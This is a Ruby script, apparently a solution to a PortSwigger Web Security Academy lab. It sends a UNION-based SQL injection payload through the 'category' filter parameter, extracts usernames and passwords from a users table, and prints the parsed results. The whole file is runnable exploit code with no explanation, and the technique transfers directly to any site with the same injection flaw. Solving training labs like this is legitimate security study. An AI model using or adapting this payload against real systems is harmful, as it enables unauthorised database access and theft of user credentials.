require 'http'
require 'nokogiri'

payload = "Pets' UNION SELECT NULL,concat(username,':',password) FROM users-- -"

url = "https://0a4a000204da4f6c81045726003f00d6.web-security-academy.net/filter"

client = HTTP.headers(
	"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
	)
	.cookies(
		:session => "qdnaZEDO0inWWypJodZqC5A96fnqCp9N"
	)

resp = client.get url,:params => {:category => "Gifts#{payload}"}
resph = Nokogiri.parse resp.body.to_s

puts resph.search('tr').text
